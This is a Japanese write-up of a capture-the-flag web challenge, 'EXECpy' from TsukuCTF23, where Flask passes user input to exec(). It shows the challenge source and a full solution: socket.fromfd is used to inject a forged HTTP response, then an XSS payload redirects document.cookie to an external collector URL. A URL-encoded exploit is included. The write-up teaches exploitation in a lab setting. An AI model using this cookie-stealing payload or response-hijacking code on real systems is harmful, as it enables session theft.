{"pageProps":{"postData":{"id":"EXECpy","contentHtml":"# EXECpy\n\n## 問題文\n\nRCEがめんどくさい?\\\nデータを`exec`に渡しといたからRCE2XSSしてね!\n\n<http://118.27.109.12:31416>\n\n**AdminBot:** <http://118.27.109.12:31416/crawler>\n\nHint\\\nwowwow\n\n## 難易度\n\n**hard**\n\n## 作問にあたって\n\nDEF CON 31で小さく開催されていたSpaceX Security Challengeにpotetisenseiと出た際のテクニックをXSSに落とし込みました。\\\npickleでRCEができるシナリオでサーバ内部のバイナリを取得する必要があったのですが、アウトバウンド通信や応答時間でのオラクルができない(共に運営インフラの問題)状況でした。\\\nそこで開いているfdに取得したいデータを流し込んでHTTP応答として返すことで、入手する手法を用いていました。\\\n現実ではXSS2RCEは最高ですが、RCE2XSSはうれしくないです。\n\n## 解法\n\nURL、AdminBot、ソースコードが渡される。\\\nアクセスするとPythonのexecでコードを実行できる謎のサービスだ。\\\n![site1.png](images/site1.png)\\\nただし実行結果は返してくれない。\\\n![site2.png](images/site2.png)\\\nURLは`http://118.27.109.12:31416/?code=print%281%29`であり、コードをクエリに渡せる。\\\nAdminBotがあることからもXSS問題だろう。\\\n![site3.png](images/site3.png)\\\nソースを見るとメインのアプリケーションは以下の通りであった。\n\n```python\nfrom flask import Flask, render_template, request\n\napp = Flask(__name__)\n\n\n@app.route(\"/\", methods=[\"GET\"])\ndef index():\n    code = request.args.get(\"code\")\n    if not code:\n        return render_template(\"index.html\")\n\n    try:\n        exec(code)\n    except:\n        pass\n\n    return render_template(\"result.html\")\n\n\nif __name__ == \"__main__\":\n    app.run(debug=True, host=\"0.0.0.0\", port=31416)\n```\n\nクローラーも見ると以下のように、Playwrightでcookieにフラグを付けてユーザの入力URLにアクセスしている。\\\nただし、フラグが付くためには`if (\"Tsukushi/2.94\" in header) and (\"🤪\" not in content):`の制限がある。\n\n```python\nimport os\nimport asyncio\nfrom playwright.async_api import async_playwright\nfrom flask import Flask, render_template, request\n\napp = Flask(__name__)\n\nDOMAIN = \"nginx\"\nFLAG = os.environ.get(\"FLAG\", \"TsukuCTF23{**********REDACTED**********}\")\n\n\n@app.route(\"/crawler\", methods=[\"GET\"])\ndef index_get():\n    return render_template(\"index_get.html\")\n\n\nasync def crawl(url):\n    async with async_playwright() as p:\n        browser = await p.chromium.launch()\n        page = await browser.new_page()\n\n        try:\n            response = await page.goto(url, timeout=5000)\n            header = await response.header_value(\"Server\")\n            content = await page.content()\n\n            if (\"Tsukushi/2.94\" in header) and (\"🤪\" not in content):\n                await page.context.add_cookies(\n                    [{\"name\": \"FLAG\", \"value\": FLAG, \"domain\": DOMAIN, \"path\": \"/\"}]\n                )\n                if url.startswith(f\"http://{DOMAIN}/?code=\") or url.startswith(\n                    f\"https://{DOMAIN}/?code=\"\n                ):\n                    await page.goto(url, timeout=5000)\n        except:\n            pass\n\n        await browser.close()\n\n\n@app.route(\"/crawler\", methods=[\"POST\"])\ndef index_post():\n    asyncio.run(\n        crawl(\n            request.form.get(\"url\").replace(\n                \"http://localhost:31416/\", f\"http://{DOMAIN}/\", 1\n            )\n        )\n    )\n    return render_template(\"index_post.html\")\n\n\nif __name__ == \"__main__\":\n    app.run(debug=True, host=\"0.0.0.0\", port=31417)\n```\n\nもう一度メインのアプリケーションの応答を確認する。\n\n```bash\n$ curl 'http://118.27.109.12:31416/?code=print%281%29' -I\nHTTP/1.1 200 OK\nServer: nginx/1.25.3\nDate: Sat, 09 Dec 2023 00:00:00 GMT\nContent-Type: text/html; charset=utf-8\nContent-Length: 1059\nConnection: close\n\n$ curl 'http://118.27.109.12:31416/?code=print%281%29'\n~~\n                <p class=\"block text-gray-700 text-sm font-bold mb-2\">\n                    Your code has been executed. However, no results will be returned. 🤪\n                </p>\n~~~\n```\n\n`Server`レスポンスヘッダーは`nginx/1.25.3`であるので`Tsukushi/2.94`ではない。\\\nまた、`🤪`もレスポンスボディに含まれている。\\\nこれらがなければ`request.cookies.get`で取得したフラグを外部に送信するだけで済む(`/bin/*`が無いが)。\\\n以上のことよりexecを行うことでFlaskの応答結果のレスポンスヘッダーとレスポンスボディを書き換えてXSSする問題だとわかる。\\\nここでexecがHTTP通信中に行われるため、Flask(かWerkzeug)がfdを保持しており、そこにデータを流し込むことでうまくレスポンスを書き換えることができそうなことに気づく。\\\nもしくは、execで自由度が高いのでPythonのメモリ上に乗っているテンプレートを書き換えることもできるかもしれない。\\\n後者はアプリケーションを破壊しそうなので、前者を試す。\\\nFlask(かWerkzeug)がfdに書き込んでいないかソースコードを調査する。\\\n[Flask Source Code](https://github.com/search?q=repo%3Apallets%2Fflask%20file%20descriptor\\&type=code)\\\n[Werkzeug Source Code](https://github.com/search?q=repo%3Apallets%2Fwerkzeug%20file%20descriptor\\&type=code)\\\nこれらを見ると[`socket.fromfd`の箇所](https://github.com/pallets/werkzeug/blob/eafbed0ce2a6bdf60e62de82bf4a8365188ac334/src/werkzeug/serving.py#L778)が使えそうなことがわかる。\\\n[ここ](https://docs.python.org/3/library/socket.html#socket.fromfd)を見るとすでにあるソケット参照のfdからソケットオブジェクトを作ってくれるらしいことがわかる。\\\nこれを用いてHTTPリクエストを流し込んでみる。\n\n```python\nimport socket\nfor fd in range(100):\n    try:\n        sock = socket.fromfd(fd, socket.AF_INET, socket.SOCK_STREAM)\n        sock.sendall(b'''HTTP/1.1 200 OK\nContent-Length: 6\nContent-Type: text/html\nConnection: Closed\n\nSatoki''')\n    except Exception as e:\n        pass\n```\n\n実行する。\n\n```bash\n$ curl 'http://118.27.109.12:31416/?code=import+socket%0D%0Afor+fd+in+range%28100%29%3A%0D%0A++++try%3A%0D%0A++++++++sock+%3D+socket.fromfd%28fd%2C+socket.AF_INET%2C+socket.SOCK_STREAM%29%0D%0A++++++++sock.sendall%28b%27%27%27HTTP%2F1.1+200+OK%0D%0AContent-Length%3A+6%0D%0AContent-Type%3A+text%2Fhtml%0D%0AConnection%3A+Closed%0D%0A%0D%0ASatoki%27%27%27%29%0D%0A++++except+Exception+as+e%3A%0D%0A++++++++pass' -v\n*   Trying 118.27.109.12:31416...\n* Connected to 118.27.109.12 (118.27.109.12) port 31416 (#0)\n> GET /?code=import+socket%0D%0Afor+fd+in+range%28100%29%3A%0D%0A++++try%3A%0D%0A++++++++sock+%3D+socket.fromfd%28fd%2C+socket.AF_INET%2C+socket.SOCK_STREAM%29%0D%0A++++++++sock.sendall%28b%27%27%27HTTP%2F1.1+200+OK%0D%0AContent-Length%3A+6%0D%0AContent-Type%3A+text%2Fhtml%0D%0AConnection%3A+Closed%0D%0A%0D%0ASatoki%27%27%27%29%0D%0A++++except+Exception+as+e%3A%0D%0A++++++++pass HTTP/1.1\n> Host: 118.27.109.12:31416\n> User-Agent: curl/7.81.0\n> Accept: */*\n>\n* Mark bundle as not supporting multiuse\n< HTTP/1.1 200 OK\n< Server: nginx/1.25.3\n< Date: Sat, 09 Dec 2023 00:00:00 GMT\n< Content-Type: text/html\n< Content-Length: 6\n< Connection: close\n<\n* Closing connection 0\nSatoki\n```\n\n無事に応答を書き換えることができた。\\\nあとは適切なレスポンスヘッダーを設定し、XSSしてフラグを外部サーバに送信してやればよい。\\\n以下のpayload.pyでXSSペイロードの作成を行う。\n\n```python\n# This script is inspired by potetisensei\n\nURL = \"https://en9i5fcxybxwa.x.pipedream.net/\" # Your server\n\npayload = f\"\"\"\n<!DOCTYPE html>\n<html lang=\"en\">\n    <head></head>\n    <body>\n    <script>location.href='{URL}?s='+document.cookie</script>\n    </body>\n</html>\n\"\"\"\n\nprint(\n    f\"\"\"\nimport socket\nfor fd in range(100):\n    try:\n        sock = socket.fromfd(fd, socket.AF_INET, socket.SOCK_STREAM)\n        sock.sendall(b'''HTTP/1.1 200 OK\nServer: Tsukushi/2.94\nContent-Length: {len(payload)}\nContent-Type: text/html\nConnection: Closed\n\n{payload}''')\n    except Exception as e:\n        pass\n\"\"\"\n)\n```\n\n実行する。\n\n```bash\n$ python payload.py\n\nimport socket\nfor fd in range(100):\n    try:\n        sock = socket.fromfd(fd, socket.AF_INET, socket.SOCK_STREAM)\n        sock.sendall(b'''HTTP/1.1 200 OK\nServer: Tsukushi/2.94\nContent-Length: 178\nContent-Type: text/html\nConnection: Closed\n\n\n<!DOCTYPE html>\n<html lang=\"en\">\n    <head></head>\n    <body>\n    <script>location.href='https://en9i5fcxybxwa.x.pipedream.net/?s='+document.cookie</script>\n    </body>\n</html>\n''')\n    except Exception as e:\n        pass\n\n```\n\nこれをURLクエリに設定すると以下になる。\n\n```\nhttp://118.27.109.12:31416/?code=%0D%0Aimport+socket%0D%0Afor+fd+in+range%28100%29%3A%0D%0A++++try%3A%0D%0A++++++++sock+%3D+socket.fromfd%28fd%2C+socket.AF_INET%2C+socket.SOCK_STREAM%29%0D%0A++++++++sock.sendall%28b%27%27%27HTTP%2F1.1+200+OK%0D%0AServer%3A+Tsukushi%2F2.94%0D%0AContent-Length%3A+178%0D%0AContent-Type%3A+text%2Fhtml%0D%0AConnection%3A+Closed%0D%0A%0D%0A%0D%0A%3C%21DOCTYPE+html%3E%0D%0A%3Chtml+lang%3D%22en%22%3E%0D%0A++++%3Chead%3E%3C%2Fhead%3E%0D%0A++++%3Cbody%3E%0D%0A++++%3Cscript%3Elocation.href%3D%27https%3A%2F%2Fen9i5fcxybxwa.x.pipedream.net%2F%3Fs%3D%27%2Bdocument.cookie%3C%2Fscript%3E%0D%0A++++%3C%2Fbody%3E%0D%0A%3C%2Fhtml%3E%0D%0A%27%27%27%29%0D%0A++++except+Exception+as+e%3A%0D%0A++++++++pass%0D%0A\n```\n\ncrawlerに投げると以下のようなリクエストが届く。\\\n![flag.png](images/flag.png)\\\nflagが得られた。\n\n## TsukuCTF23{175\\_4\\_73rr1bl3\\_4774ck\\_70\\_1n73rrup7\\_h77p}\n","title":"EXECpy","description":"RCE2XSS","author":"satoki00","genre":"web","solver":15,"point":499}},"__N_SSG":true}